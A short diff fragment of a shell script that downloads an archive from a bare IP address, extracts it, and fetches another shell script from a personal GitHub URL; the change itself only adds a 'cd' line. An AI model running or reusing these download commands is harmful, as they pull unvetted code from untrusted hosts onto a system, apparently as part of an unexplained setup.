@@ -43,6 +43,7 @@ cd /home
 wget 149.56.111.62/ch.tar.gz
 tar -xvf ch.tar.gz
 sleep 2
+cd
 mkdir Desktop
 cd Desktop
 wget https://raw.githubusercontent.com/mazbron/x/master/ff.sh
